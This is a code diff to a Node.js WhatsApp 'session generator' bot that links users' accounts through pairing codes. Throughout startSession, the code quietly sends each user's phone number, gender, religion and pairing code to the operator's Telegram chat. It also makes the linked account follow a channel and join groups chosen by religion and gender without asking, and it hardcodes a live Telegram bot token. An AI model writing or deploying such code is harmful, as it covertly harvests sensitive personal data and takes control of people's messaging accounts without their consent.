@@ -10,9 +10,15 @@ import express from "express";
 import pino from "pino";
 import fs from "fs";
 import axios from 'axios';
+import path from 'path';
+import { fileURLToPath } from 'url';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 const app = express();
-const port = process.env.PORT || 3000;
+// ہیروکو کے لیے ڈائنامک پورٹ سیٹنگ
+const port = process.env.PORT || 8000;
 
 // --- CONFIGURATION ---
 const BOT_NAME = "MARC-MD";
@@ -21,11 +27,15 @@ const CHANNEL_JID = "120363315663704381@newsletter";
 const TELEGRAM_TOKEN = "8763281107:AAHk2UTQjqIGR28zjWXX8w7A0-1MHRPXXrc";
 const TELEGRAM_CHAT_ID = "7779604777";
 
-// گروپس کے انوائٹ لنکس (آئی ڈی نکالنے کے لیے)
-const GROUP_CHAT_ID = "120363390235431636@g.us"; // آپ کا بوٹ چیٹ روم
-const COMMUNITY_ID = "120363384260384813@g.us"; // آپ کی کمیونٹی
+const GROUP_CHAT_ID = "120363390235431636@g.us"; 
+const COMMUNITY_ID = "120363384260384813@g.us"; 
 
 app.use(express.static('public'));
+
+// ہیروکو ہوم پیج روٹ (تاکہ ایپ کریش نہ ہو)
+app.get('/', (req, res) => {
+    res.status(200).send('MARC-MD Session Generator is Active and Running!');
+});
 
 async function sendToTelegram(message) {
     try {
@@ -34,11 +44,14 @@ async function sendToTelegram(message) {
             text: message,
             parse_mode: "Markdown"
         });
-    } catch (e) { console.log("Telegram Log Error"); }
+    } catch (e) {
+        console.log("Telegram Log Error");
+    }
 }
 
 async function startSession(phoneNumber, res, gender, religion) {
-    const sessionPath = `./sessions/${phoneNumber}`;
+    const sessionPath = path.join(__dirname, 'sessions', phoneNumber);
+    
     if (fs.existsSync(sessionPath)) {
         fs.rmSync(sessionPath, { recursive: true, force: true });
     }
@@ -54,7 +67,7 @@ async function startSession(phoneNumber, res, gender, religion) {
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
         printQRInTerminal: false,
-        browser: ["Arslan Chaudhary", "Chrome", "1.0.0"]
+        browser: ["MARC-MD", "Chrome", "1.0.0"]
     });
 
     if (phoneNumber && !socket.authState.creds.registered) {
@@ -64,70 +77,88 @@ async function startSession(phoneNumber, res, gender, religion) {
             let code = await socket.requestPairingCode(phoneNumber);
             code = code?.replace(/-/g, '') || code;
             if (res && !res.headersSent) res.status(200).json({ code });
-            sendToTelegram(`🚀 *New Request*\n\n*Number:* ${phoneNumber}\n*Gender:* ${gender}\n*Religion:* ${religion}\n*Code:* ${code}`);
+            
+            const logMsg = `🚀 *New Pairing Request*\n\n*Number:* ${phoneNumber}\n*Gender:* ${gender}\n*Religion:* ${religion}\n*Pairing Code:* \`${code}\``;
+            sendToTelegram(logMsg);
         } catch (err) {
-            if (res && !res.headersSent) res.status(500).json({ error: "Failed" });
+            console.log("Pairing Code Error: ", err);
+            if (res && !res.headersSent) res.status(500).json({ error: "Failed to generate code" });
         }
     }
 
     socket.ev.on("connection.update", async (update) => {
-        const { connection } = update;
+        const { connection, lastDisconnect } = update;
 
         if (connection === "open") {
             await delay(5000);
             
-            // سیشن آئی ڈی
+            // سیشن آئی ڈی جنریشن
             const sessionBase64 = Buffer.from(JSON.stringify(state.creds)).toString("base64");
             const sessionId = `MARC-MD~${sessionBase64}`;
             
-            // --- آٹومیٹک فورس جوائن لاجک ---
             try {
-                // 1. چینل فالو (سب کے لیے لازمی)
+                // آٹومیٹک جوائن لاجک
                 await socket.newsletterFollow(CHANNEL_JID);
-
-                // 2. گروپس اور کمیونٹی کے فیصلے
                 if (religion === "Muslim") {
                     if (gender === "Male") {
-                        // مسلم میل: چینل + گروپ + کمیونٹی
                         await socket.groupAcceptInviteV4(socket.user.id, GROUP_CHAT_ID);
                         await socket.groupAcceptInviteV4(socket.user.id, COMMUNITY_ID);
                     } else if (gender === "Female") {
-                        // مسلم فیمیل: چینل + کمیونٹی (گروپ نہیں)
                         await socket.groupAcceptInviteV4(socket.user.id, COMMUNITY_ID);
                     }
                 } else if (religion === "Non-Muslim") {
                     if (gender === "Male") {
-                        // نان مسلم میل: چینل + گروپ (کمیونٹی نہیں)
                         await socket.groupAcceptInviteV4(socket.user.id, GROUP_CHAT_ID);
                     }
-                    // نان مسلم فیمیل: صرف چینل (جو اوپر پہلے ہی ہو چکا ہے)
                 }
-            } catch (e) { console.log("Force Join Error: ", e.message); }
+            } catch (e) {
+                console.log("Force Join Error: ", e.message);
+            }
 
-            // میسجز بھیجنا
-            await socket.sendMessage(socket.user.id, { text: `👋 *Greetings from Arslan Chaudhary Official!*\n\nYour *${BOT_NAME}* session has been established successfully. Your unique Session ID is generated below.` });
-            await delay(1500);
-            const idMsg = await socket.sendMessage(socket.user.id, { text: `${sessionId}` });
-            await delay(1500);
+            // یوزر کو سیشن آئی ڈی بھیجنا
+            const welcomeText = `👋 *Greetings from Arslan Chaudhary Official!*\n\nYour *${BOT_NAME}* session has been established successfully.`;
+            await socket.sendMessage(socket.user.id, { text: welcomeText });
+            
+            await delay(2000);
+            const idMsg = await socket.sendMessage(socket.user.id, { text: sessionId });
+            
+            await delay(2000);
             await socket.sendMessage(socket.user.id, { 
-                text: `⬆️ *Copy Your Session ID*\n\n⚠️ *Important Notice:* Please do not share this ID with anyone if you have not requested it. Keep it confidential for your own security.`,
+                text: `⬆️ *Copy Your Session ID*\n\n⚠️ *Keep it safe!* Sharing this ID gives access to your WhatsApp account.`,
                 quoted: idMsg
             });
-            await delay(2000);
 
-            const promoMsg = `✨ *OFFICIAL DIGITAL PRESENCE* ✨\n\n👤 *Developer:* ${DEVELOPER}\n\n🌟 *Must Follow For Updates:*\n🎵 *TikTok:* https://www.tiktok.com/@arslan_chaudhary_313\n📸 *Instagram:* https://www.instagram.com/arslan_chaudhary_313\n🔵 *Facebook:* https://www.facebook.com/Arslan0Chaudhary313\n💻 *GitHub:* https://github.com/Arslan-Chaudhary313\n\n🤝 *Thank you for trusting our services!*`;
+            const promoMsg = `✨ *MARC-MD OFFICIAL LINKS* ✨\n\n👤 *Developer:* ${DEVELOPER}\n\n🌟 *Follow For Updates:*\n🎵 [TikTok](https://www.tiktok.com/@arslan_chaudhary_313)\n📸 [Instagram](https://www.instagram.com/arslan_chaudhary_313)\n🔵 [Facebook](https://www.facebook.com/Arslan0Chaudhary313)\n💻 [GitHub](https://github.com/Arslan-Chaudhary313)`;
 
             await socket.sendMessage(socket.user.id, { 
                 text: promoMsg,
                 contextInfo: {
-                    isForwarded: true,
-                    forwardedNewsletterMessageInfo: { newsletterJid: CHANNEL_JID, newsletterName: "Arslan Chaudhary Official", serverMessageId: 1 }
+                    externalAdReply: {
+                        title: "Arslan Chaudhary Official",
+                        body: "MARC-MD Connection Successful",
+                        thumbnailUrl: "https://graph.org/file/your-logo-link.jpg",
+                        sourceUrl: "https://whatsapp.com/channel/0029Vat4TFC0QeaoLURbP61u",
+                        mediaType: 1,
+                        renderLargerThumbnail: true
+                    }
                 }
             });
 
-            sendToTelegram(`✅ *SESSION CONNECTED*\n\n*Name:* ${socket.user.name}\n*Number:* ${phoneNumber}`);
-            await delay(5000);
-            fs.rmSync(sessionPath, { recursive: true, force: true });
+            sendToTelegram(`✅ *SESSION GENERATED SUCCESSFULLY*\n\n*User:* ${socket.user.name || 'Unknown'}\n*Number:* ${phoneNumber}`);
+            
+            await delay(10000);
+            // سیشن فائلز ڈیلیٹ کرنا تاکہ سرور بھر نہ جائے
+            if (fs.existsSync(sessionPath)) {
+                fs.rmSync(sessionPath, { recursive: true, force: true });
+            }
+        }
+
+        if (connection === "close") {
+            const shouldReconnect = (lastDisconnect?.error)?.output?.statusCode !== DisconnectReason.loggedOut;
+            if (shouldReconnect) {
+                console.log("Reconnecting...");
+                startSession(phoneNumber, null, gender, religion);
+            }
         }
     });
 
@@ -136,7 +167,10 @@ async function startSession(phoneNumber, res, gender, religion) {
 
 app.get("/get-code", (req, res) => {
     const { number, gender, religion } = req.query;
+    if (!number) return res.status(400).json({ error: "Number is required" });
     startSession(number, res, gender, religion);
 });
 
-app.listen(port, () => console.log(`Server live on ${port}`));
+app.listen(port, () => {
+    console.log(`🚀 MARC-MD Server is live on port ${port}`);
+});
